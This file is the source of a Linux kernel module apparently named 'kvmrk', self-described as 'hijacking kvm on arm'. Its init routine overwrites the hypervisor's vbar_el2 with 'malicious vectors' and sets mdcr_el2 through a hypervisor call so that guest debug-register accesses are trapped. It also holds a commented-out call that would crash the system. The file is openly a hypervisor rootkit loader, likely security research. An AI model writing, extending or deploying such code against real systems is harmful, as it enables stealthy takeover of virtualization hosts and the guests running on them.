#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kvm_host.h>
#include <asm/sysreg.h>

#include "include/kvmrk.h"

extern char kvmrk_vectors[];
extern void hijack_mdcr_el2(void);
extern void kvmrk_replace_vbar_el2(unsigned long new_vbar_el2);
extern void kvmrk_call_hyp(unsigned long func_pa);
extern void kvmrk_crash_everything(void);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("wintermute");
MODULE_DESCRIPTION("hijacking kvm on arm");
MODULE_VERSION("0.01");

static int __init kvmrk_init(void) {
    printk(KERN_INFO "kvmrk: module loaded\n");

    kvmrk_replace_vbar_el2(virt_to_phys(kvmrk_vectors));
    printk(KERN_INFO "kvmrk: replaced vbar_el2 with malicious vectors\n");

    kvmrk_call_hyp(virt_to_phys(hijack_mdcr_el2));
    printk(KERN_INFO "kvmrk: trapped accesses to debug regs from el1 via mdcr_el2\n");

    // kvmrk_crash_everything();

    return 0;
}

static void __exit kvmrk_exit(void) {
    printk(KERN_INFO "kvmrk: module unloaded\n");
}

module_init(kvmrk_init);
module_exit(kvmrk_exit);
